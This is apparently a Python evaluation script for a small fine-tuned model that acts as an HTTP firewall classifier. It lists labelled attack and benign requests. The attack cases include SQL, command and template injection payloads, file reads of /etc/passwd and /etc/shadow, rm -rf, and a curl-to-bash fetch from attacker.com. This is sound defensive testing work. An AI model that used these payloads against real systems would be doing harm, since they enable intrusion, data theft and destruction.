import torch
import re
import time
import json
import random
import statistics
from collections import defaultdict
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel
import os

# ── Configuración ──────────────────────────────────────────────
BASE_MODEL  = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"
ADAPTER_DIR = os.path.expanduser("~/Desktop/firewall-IA/model-output-v3")
EVAL_FILE = os.path.expanduser("~/Desktop/firewall-IA/eval.jsonl")

INSTRUCTION = (
    "You are a network security firewall classifier. "
    "Analyze the following HTTP request and respond with exactly: "
    "ALLOW or BLOCK | <one sentence reason>. Then output ###END###"
)

# ── Test cases: (request, expected_label, category, description) ──
# SYSTEMATIC: 5 cases per category × 19 categories = 95 BLOCK
SYSTEMATIC_CASES = [

    # ── 1. SQL Injection ──────────────────────────────────────────
    (
        "GET /api/users?id=1' OR '1'='1 HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "Classic OR bypass",
    ),
    (
        "GET /login?user=admin'-- HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "Comment-based auth bypass",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nq=1; DROP TABLE users--",
        "BLOCK", "SQL Injection", "DROP TABLE via POST body",
    ),
    (
        "GET /products?category=shoes' UNION SELECT username,password,3 FROM users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "UNION-based data extraction",
    ),
    (
        "GET /api/item?id=1' AND SLEEP(5)-- HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "Time-based blind injection",
    ),

    # ── 2. XSS Injection ──────────────────────────────────────────
    (
        "GET /search?q=<script>alert('xss')</script> HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "Basic script tag",
    ),
    (
        "GET /profile?name=<img src=x onerror=alert(document.cookie)> HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "img onerror payload",
    ),
    (
        "GET /redirect?url=javascript:alert(1) HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "javascript: URI scheme",
    ),
    (
        "POST /comment HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nbody=\"><svg onload=alert(1)>",
        "BLOCK", "XSS Injection", "SVG onload injection",
    ),
    (
        "GET /page?title=<iframe src=\"javascript:alert('xss')\"></iframe> HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "iframe javascript src",
    ),

    # ── 3. Command Injection ──────────────────────────────────────
    (
        "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Semicolon chaining",
    ),
    (
        "GET /api/lookup?domain=example.com|whoami HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Pipe operator",
    ),
    (
        "GET /api/exec?cmd=`id` HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Backtick subshell",
    ),
    (
        "POST /api/convert HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nfile=test.jpg;$(curl http://attacker.com/shell.sh|bash)",
        "BLOCK", "Command Injection", "Curl-based RCE",
    ),
    (
        "GET /api/resize?width=100&height=100;rm -rf /tmp/* HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Destructive rm -rf",
    ),

    # ── 4. LDAP Injection ────────────────────────────────────────
    (
        "GET /api/user?username=*)(uid=*))(|(uid=* HTTP/1.1\nHost: target.com",
        "BLOCK", "LDAP Injection", "LDAP filter escape",
    ),
    (
        "POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin)(&)&password=anything",
        "BLOCK", "LDAP Injection", "Auth bypass with (&)",
    ),
    (
        "GET /directory?search=*)(objectClass=*) HTTP/1.1\nHost: target.com",
        "BLOCK", "LDAP Injection", "objectClass wildcard",
    ),
    (
        "GET /users?cn=*)(|(cn=admin)(cn=root HTTP/1.1\nHost: target.com",
        "BLOCK", "LDAP Injection", "OR-chained CN filter",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nquery=\\2a)(uid=administrator)(|(uid=\\2a",
        "BLOCK", "LDAP Injection", "Hex-encoded wildcard",
    ),

    # ── 5. XXE Injection ─────────────────────────────────────────
    (
        "POST /api/xml HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "BLOCK", "XXE Injection", "Classic file:/// entity",
    ),
    (
        "POST /upload HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><data>&xxe;</data>",
        "BLOCK", "XXE Injection", "Remote DTD exfil",
    ),
    (
        "POST /parse HTTP/1.1\nHost: target.com\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">%xxe;]><foo/>",
        "BLOCK", "XXE Injection", "XXE + SSRF to IMDS",
    ),
    (
        "POST /import HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><order><id>&xxe;</id></order>",
        "BLOCK", "XXE Injection", "etc/shadow exfil",
    ),
    (
        "POST /invoice HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>",
        "BLOCK", "XXE Injection", "Billion laughs DoS",
    ),

    # ── 6. Open Redirect ─────────────────────────────────────────
    (
        "GET /logout?redirect=http://evil.com/phishing HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "Absolute URL redirect",
    ),
    (
        "GET /auth/callback?next=//evil.com HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "Protocol-relative URL",
    ),
    (
        "GET /sso?return_to=javascript:alert(document.cookie) HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "javascript: scheme in redirect",
    ),
    (
        "GET /track?url=http://target.com%2F@evil.com/steal HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "URL confusion with @",
    ),
    (
        "GET /go?goto=//evil.com/%2F.. HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "Path traversal in redirect",
    ),

    # ── 7. SSRF ──────────────────────────────────────────────────
    (
        "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com",
        "BLOCK", "SSRF", "AWS IMDS endpoint",
    ),
    (
        "POST /api/proxy HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://internal.corp.local/admin",
        "BLOCK", "SSRF", "Internal network access",
    ),
    (
        "GET /webhook?endpoint=http://localhost:6379/ HTTP/1.1\nHost: target.com",
        "BLOCK", "SSRF", "Redis localhost probe",
    ),
    (
        "POST /screenshot HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"url\":\"file:///etc/passwd\"}",
        "BLOCK", "SSRF", "file:// scheme via JSON",
    ),
    (
        "GET /api/resolve?host=http://0.0.0.0:22/ HTTP/1.1\nHost: target.com",
        "BLOCK", "SSRF", "0.0.0.0 SSH probe",
    ),

    # ── 8. JWT Attacks ───────────────────────────────────────────
    (
        "GET /api/admin HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
        "BLOCK", "JWT Attacks", "alg:none unsigned token",
    ),
    (
        "GET /api/profile HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.forged_signature",
        "BLOCK", "JWT Attacks", "Forged HMAC signature",
    ),
    (
        "GET /api/settings HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjB9.invalid",
        "BLOCK", "JWT Attacks", "Expired token exp=0",
    ),
    (
        "GET /api/data HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ.sig",
        "BLOCK", "JWT Attacks", "kid path traversal ../../../dev/null",
    ),
    (
        "GET /api/export HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6OTk5OTk5OTk5OSwianRpIjoiLi4vLi4vLi4vZXRjL3Bhc3N3ZCJ9.x",
        "BLOCK", "JWT Attacks", "JWT jti path injection",
    ),

    # ── 9. GraphQL Injection ─────────────────────────────────────
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"{ __schema { types { name fields { name } } } }\"}",
        "BLOCK", "GraphQL Injection", "__schema introspection",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"{ user(id: \\\"1 UNION SELECT username,password FROM users--\\\") { id name } }\"}",
        "BLOCK", "GraphQL Injection", "SQL injection inside GQL arg",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"{ a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename }\"}",
        "BLOCK", "GraphQL Injection", "Batched alias DoS query",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"mutation { updateUser(id: 1, role: \\\"admin\\\") { id role } }\"}",
        "BLOCK", "GraphQL Injection", "Privilege escalation mutation",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[{\"query\":\"{ user(id:1){name} }\"},{\"query\":\"{ user(id:2){name} }\"},{\"query\":\"{ user(id:3){name} }\"}]",
        "BLOCK", "GraphQL Injection", "Batch query array abuse",
    ),

    # ── 10. NoSQL Injection ──────────────────────────────────────
    (
        "POST /api/login HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
        "BLOCK", "NoSQL Injection", "MongoDB $gt auth bypass",
    ),
    (
        "GET /api/users?filter={\"$where\":\"this.role=='admin'\"} HTTP/1.1\nHost: target.com",
        "BLOCK", "NoSQL Injection", "$where JS execution",
    ),
    (
        "GET /api/search?name[$regex]=.* HTTP/1.1\nHost: target.com",
        "BLOCK", "NoSQL Injection", "$regex wildcard dump",
    ),
    (
        "POST /api/find HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
        "BLOCK", "NoSQL Injection", "$ne null bypass",
    ),
    (
        "POST /api/auth HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":{\"$or\":[{\"role\":\"admin\"},{\"active\":true}]}}",
        "BLOCK", "NoSQL Injection", "$or operator injection",
    ),

    # ── 11. SSTI ─────────────────────────────────────────────────
    (
        "GET /greet?name={{7*7}} HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "Jinja2 arithmetic probe",
    ),
    (
        "POST /render HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\ntemplate={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "BLOCK", "SSTI", "Python globals RCE",
    ),
    (
        "GET /hello?msg=${7*7} HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "FreeMarker/Velocity ${} probe",
    ),
    (
        "GET /page?title=<%= 7*7 %> HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "ERB template probe",
    ),
    (
        "GET /view?tpl={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}} HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "Jinja2 subprocess RCE",
    ),

    # ── 12. File Inclusion ────────────────────────────────────────
    (
        "GET /index.php?lang=../../../../etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "LFI path traversal",
    ),
    (
        "GET /page.php?file=php://filter/convert.base64-encode/resource=config HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "PHP filter wrapper",
    ),
    (
        "GET /include.php?page=http://evil.com/shell.php HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "Remote file inclusion",
    ),
    (
        "GET /view.php?template=data://text/plain,<?php system('id')?> HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "data:// wrapper RCE",
    ),
    (
        "GET /load.php?module=expect://id HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "expect:// wrapper RCE",
    ),

    # ── 13. Insecure Deserialization ─────────────────────────────
    (
        "POST /api/session HTTP/1.1\nHost: target.com\nContent-Type: application/x-java-serialized-object\n\nrO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
        "BLOCK", "Insecure Deserialization", "Java serialized object",
    ),
    (
        "POST /api/data HTTP/1.1\nHost: target.com\nContent-Type: application/octet-stream\n\nO:8:\"stdClass\":1:{s:4:\"exec\";s:9:\"id>/tmp/x\";}",
        "BLOCK", "Insecure Deserialization", "PHP object injection",
    ),
    (
        "POST /api/restore HTTP/1.1\nHost: target.com\nContent-Type: application/octet-stream\n\n80 04 95 1e 00 00 00 00 00 00 00 8c 02 6f 73 94 8c 06 73 79 73 74 65 6d 94 93 94 8c 02 69 64 94 85 94 52 94 2e",
        "BLOCK", "Insecure Deserialization", "Python pickle RCE",
    ),
    (
        "POST /api/config HTTP/1.1\nHost: target.com\nContent-Type: application/yaml\n\n!!python/object/apply:os.system ['id']",
        "BLOCK", "Insecure Deserialization", "YAML python object",
    ),
    (
        "POST /viewstate HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\n__VIEWSTATE=%2FwEPDwUKLTM2NTIzNDA3OA9kFgICAw8WAh4HZW5jcnlwdA%2FvAI%2BBp9HLiYX0qXL78VHXtCX1NA%3D%3D",
        "BLOCK", "Insecure Deserialization", ".NET ViewState gadget",
    ),

    # ── 14. HTTP Request Smuggling ────────────────────────────────
    (
        "POST /api/data HTTP/1.1\nHost: target.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\r\n\r\nGET /admin HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Request Smuggling", "CL.TE conflict",
    ),
    (
        "POST / HTTP/1.1\nHost: target.com\nContent-Length: 44\nTransfer-Encoding: chunked\n\nb\r\nsmuggled=yes\r\n0\r\n\r\nGET /internal HTTP/1.1",
        "BLOCK", "HTTP Request Smuggling", "TE.CL split request",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Length: 49\nTransfer-Encoding: chunked\nTransfer-Encoding: identity\n\ne\r\nq=smuggling+test\r\n0\r\n\r\n",
        "BLOCK", "HTTP Request Smuggling", "TE.TE obfuscated header",
    ),
    (
        "POST /update HTTP/1.1\nHost: target.com\nTransfer-Encoding: xchunked\nContent-Length: 4\n\n1\r\nZ\r\n0\r\n\r\n",
        "BLOCK", "HTTP Request Smuggling", "xchunked TE variant",
    ),
    (
        "POST /submit HTTP/1.1\nHost: target.com\nContent-Length: 30\nTransfer-Encoding:\tchunked\n\n0\r\n\r\nPOST /poison HTTP/1.1\r\n",
        "BLOCK", "HTTP Request Smuggling", "Tab-obfuscated TE header",
    ),

    # ── 15. CRLF Injection ───────────────────────────────────────
    (
        "GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=hijacked HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Cookie injection via %0d%0a",
    ),
    (
        "GET /log?msg=hello%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Response splitting",
    ),
    (
        "GET /page?name=test%0d%0aLocation:%20http://evil.com HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Location header injection",
    ),
    (
        "GET /search?q=normal%0d%0aX-Injected-Header:%20malicious HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Custom header injection",
    ),
    (
        "POST /contact HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nname=attacker%0d%0aBcc%3A%20victim%40evil.com&message=hello",
        "BLOCK", "CRLF Injection", "Email header injection",
    ),

    # ── 16. HTTP Parameter Pollution ─────────────────────────────
    (
        "GET /search?id=1&id=2&id=99999 HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Duplicate id params",
    ),
    (
        "GET /api/user?role=user&role=admin HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Role escalation via duplicate",
    ),
    (
        "POST /transfer HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\namount=100&to=alice&to=attacker&amount=99999",
        "BLOCK", "HTTP Parameter Pollution", "Payment redirect via HPP",
    ),
    (
        "GET /filter?status=active&status=inactive&status=all HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Filter bypass via repetition",
    ),
    (
        "GET /api/access?token=legit&token=&token=admin HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Token pollution with empty value",
    ),

    # ── 17. XPath Injection ──────────────────────────────────────
    (
        "POST /xml HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<user><name>' or '1'='1</name></user>",
        "BLOCK", "XPath Injection", "Classic XPath OR bypass",
    ),
    (
        "GET /api/lookup?user=admin' or 1=1 or 'a'='a HTTP/1.1\nHost: target.com",
        "BLOCK", "XPath Injection", "XPath tautology",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nquery='] | //* | //*['",
        "BLOCK", "XPath Injection", "Union-based node dump",
    ),
    (
        "GET /directory?cn=test') or ('1'='1 HTTP/1.1\nHost: target.com",
        "BLOCK", "XPath Injection", "Parenthesis escape",
    ),
    (
        "POST /authenticate HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=' or substring(password,1,1)='a",
        "BLOCK", "XPath Injection", "Blind XPath substring extraction",
    ),

    # ── 18. Path Traversal ───────────────────────────────────────
    (
        "GET /files?path=../../etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Basic ../ traversal",
    ),
    (
        "GET /download?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "URL-encoded ../ traversal",
    ),
    (
        "GET /static/....//....//etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Double-dot slash bypass",
    ),
    (
        "GET /assets/%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Fully encoded traversal",
    ),
    (
        "GET /upload?dest=..\\..\\windows\\system32\\config\\sam HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Windows backslash traversal",
    ),

    # ── 19. CSRF ─────────────────────────────────────────────────
    (
        "POST /api/transfer HTTP/1.1\nHost: bank.com\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://evil.com\nReferer: http://evil.com/attack.html\n\namount=10000&to=attacker",
        "BLOCK", "CSRF", "Forged cross-origin transfer",
    ),
    (
        "POST /api/change-email HTTP/1.1\nHost: app.com\nContent-Type: application/x-www-form-urlencoded\nOrigin: https://evil.com\n\nemail=attacker%40evil.com",
        "BLOCK", "CSRF", "Email change from cross-origin",
    ),
    (
        "POST /admin/delete-user HTTP/1.1\nHost: target.com\nReferer: https://attacker.com/csrf.html\nContent-Type: application/x-www-form-urlencoded\n\nuser_id=42",
        "BLOCK", "CSRF", "Admin action with attacker referer",
    ),
    (
        "POST /api/password-reset HTTP/1.1\nHost: target.com\nOrigin: null\nContent-Type: application/x-www-form-urlencoded\n\nnew_password=hacked123",
        "BLOCK", "CSRF", "Null origin CSRF bypass",
    ),
    (
        "POST /settings/update HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://evil.com\n\nnotification_email=attacker%40evil.com&csrf_token=",
        "BLOCK", "CSRF", "Empty CSRF token bypass",
    ),
]

# ── Adversarial cases: 20 cases ───────────────────────────────────
# (request, expected, category, description)
ADVERSARIAL_CASES = [
    # URL-encoded payloads
    (
        "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL injection URL-encoded (' OR '1'='1)",
    ),
    (
        "GET /page?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS URL-encoded (<script>)",
    ),
    (
        "GET /files?path=..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "Path traversal URL-encoded",
    ),
    # Double-encoded payloads
    (
        "GET /search?q=%2527%2520OR%25201%253D1 HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL injection double-encoded",
    ),
    (
        "GET /view?x=%253Cscript%253Ealert(1)%253C/script%253E HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS double-encoded",
    ),
    # Mixed case bypasses
    (
        "GET /api/users?id=1' oR '1'='1 HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL mixed-case OR",
    ),
    (
        "GET /products?q=1' uNiOn SeLeCt username,password FROM users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL UNION mixed case",
    ),
    (
        "GET /search?q=<ScRiPt>aLeRt(1)</sCrIpT> HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS mixed case tag",
    ),
    # Comment-based split
    (
        "GET /api/items?id=1/**/UNION/**/SELECT/**/password/**/FROM/**/users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL UNION with comment separators",
    ),
    (
        "GET /search?a=1'%20UN&b=ION%20SELECT%20password%20FROM%20users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL payload split across params",
    ),
    # IFS and bash evasion
    (
        "GET /api/ping?host=127.0.0.1|$(cat${IFS}/etc/passwd) HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "Command injection IFS evasion",
    ),
    (
        "GET /api/ping?host=127.0.0.1;$(whoami) HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "Command injection bash substitution",
    ),
    # Unicode escape
    (
        "GET /search?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS unicode-escaped tags",
    ),
    # Python SSTI advanced
    (
        "GET /api/user?input={{''.__class__.__mro__[1].__subclasses__()}} HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SSTI MRO subclasses probe",
    ),
    # False positive traps (ALLOW)
    (
        "GET /ui/dropdown?action=drop&item=table HTTP/1.1\nHost: app.com",
        "ALLOW", "Adversarial", "Legit UI action with 'drop table' keywords",
    ),
    (
        "GET /blog/post?title=how-to-union-workers-rights HTTP/1.1\nHost: blog.example.com",
        "ALLOW", "Adversarial", "Legit blog URL with 'union'",
    ),
    (
        "GET /api/search?q=select+your+plan HTTP/1.1\nHost: app.com",
        "ALLOW", "Adversarial", "Legit search with 'select'",
    ),
    (
        "POST /api/users HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"role\":\"admin\",\"active\":true,\"username\":\"bob\"}",
        "ALLOW", "Adversarial", "Legit admin API call with role field",
    ),
    # CSIC-style traffic (Konqueror UA + JSESSIONID — model may over-fit)
    (
        "GET /publico/carrito.jsp HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nCookie: JSESSIONID=45F75956E77588BAF95AAA39C1B01CE7",
        "ALLOW", "Adversarial", "CSIC-style legit request (Konqueror UA)",
    ),
    (
        "GET /publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nCookie: JSESSIONID=0C548E66939A099DBFEAAA9656B7E1FA",
        "ALLOW", "Adversarial", "CSIC cart-clear legit request",
    ),
]

# ── False positive stress test: 20 ALLOW cases ────────────────────
FALSE_POSITIVE_CASES = [
    (
        "GET /api/products?category=electronics&page=1&sort=price_asc HTTP/1.1\nHost: shop.com",
        "ALLOW", "False Positive", "Standard e-commerce listing",
    ),
    (
        "POST /api/login HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"username\":\"alice\",\"password\":\"P@ssw0rd!\"}",
        "ALLOW", "False Positive", "Normal login with special chars in password",
    ),
    (
        "GET /index.html HTTP/1.1\nHost: example.com",
        "ALLOW", "False Positive", "Simple homepage request",
    ),
    (
        "GET /api/status HTTP/1.1\nHost: monitor.example.com",
        "ALLOW", "False Positive", "Health check endpoint",
    ),
    (
        "GET /api/me HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJBbGljZSBTbWl0aCIsImlhdCI6MTcxNjIzOTAyMiwiZXhwIjoxNzE2MjQyNjIyfQ.validSignature",
        "ALLOW", "False Positive", "Valid JWT bearer token",
    ),
    (
        "GET /search?q=how+to+select+a+good+password&lang=en HTTP/1.1\nHost: docs.example.com",
        "ALLOW", "False Positive", "Search query with benign 'select'",
    ),
    (
        "POST /api/feedback HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"message\":\"The <b>best</b> product & service I've ever used!\"}",
        "ALLOW", "False Positive", "User content with HTML entities",
    ),
    (
        "GET /users/42/profile HTTP/1.1\nHost: api.example.com",
        "ALLOW", "False Positive", "REST endpoint with numeric ID",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\":\"{ currentUser { id name email } }\"}",
        "ALLOW", "False Positive", "Benign GraphQL user query",
    ),
    (
        "GET /api/reports?filter=active&sort=desc&limit=100 HTTP/1.1\nHost: app.example.com",
        "ALLOW", "False Positive", "API filter params",
    ),
    (
        "POST /api/password-reset HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"email\":\"alice@example.com\"}",
        "ALLOW", "False Positive", "Password reset by email",
    ),
    (
        "GET /files/report_2024-01-15.pdf HTTP/1.1\nHost: docs.example.com",
        "ALLOW", "False Positive", "File download with dots in filename",
    ),
    (
        "POST /webhook HTTP/1.1\nHost: app.com\nContent-Type: application/json\nX-Hub-Signature: sha256=abc123\n\n{\"event\":\"push\",\"payload\":\"dGVzdA==\"}",
        "ALLOW", "False Positive", "Webhook with base64 payload",
    ),
    (
        "GET /api/products/search?q=select+blue+jeans&size=32&color=blue HTTP/1.1\nHost: shop.com",
        "ALLOW", "False Positive", "Shopping search with 'select' keyword",
    ),
    (
        "POST /api/orders HTTP/1.1\nHost: shop.com\nContent-Type: application/json\n\n{\"items\":[{\"id\":1,\"qty\":2},{\"id\":5,\"qty\":1}],\"coupon\":\"SAVE10\"}",
        "ALLOW", "False Positive", "Order submission with coupon code",
    ),
    (
        "GET /api/analytics?from=2024-01-01&to=2024-12-31&group_by=day HTTP/1.1\nHost: dashboard.example.com\nAuthorization: Bearer validtoken123",
        "ALLOW", "False Positive", "Analytics date range query",
    ),
    (
        "PUT /api/users/99/settings HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"theme\":\"dark\",\"language\":\"en\",\"notifications\":true}",
        "ALLOW", "False Positive", "User settings update",
    ),
    (
        "GET /cdn/assets/app.min.js?v=2.3.1 HTTP/1.1\nHost: cdn.example.com",
        "ALLOW", "False Positive", "CDN asset request with version",
    ),
    (
        "POST /api/contact HTTP/1.1\nHost: company.com\nContent-Type: application/json\n\n{\"name\":\"Bob & Alice\",\"email\":\"bob@example.com\",\"subject\":\"Question about <Enterprise> plan\"}",
        "ALLOW", "False Positive", "Contact form with angle brackets and ampersand",
    ),
    (
        "GET /api/items?ids=1,2,3,4,5&fields=id,name,price HTTP/1.1\nHost: api.example.com",
        "ALLOW", "False Positive", "Multi-ID batch fetch with field selection",
    ),
]

# ── Combined suite ────────────────────────────────────────────────
ALL_CASES = SYSTEMATIC_CASES + ADVERSARIAL_CASES + FALSE_POSITIVE_CASES

# ── Cargar modelo ─────────────────────────────────────────────────
print("[1/3] Cargando modelo fine-tuneado...")

bnb_config = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_quant_type="nf4",
    bnb_4bit_compute_dtype=torch.float16,
)

tokenizer = AutoTokenizer.from_pretrained(ADAPTER_DIR)
tokenizer.pad_token = tokenizer.eos_token

base_model = AutoModelForCausalLM.from_pretrained(
    BASE_MODEL,
    quantization_config=bnb_config,
    device_map="auto",
)
base_model.resize_token_embeddings(len(tokenizer))

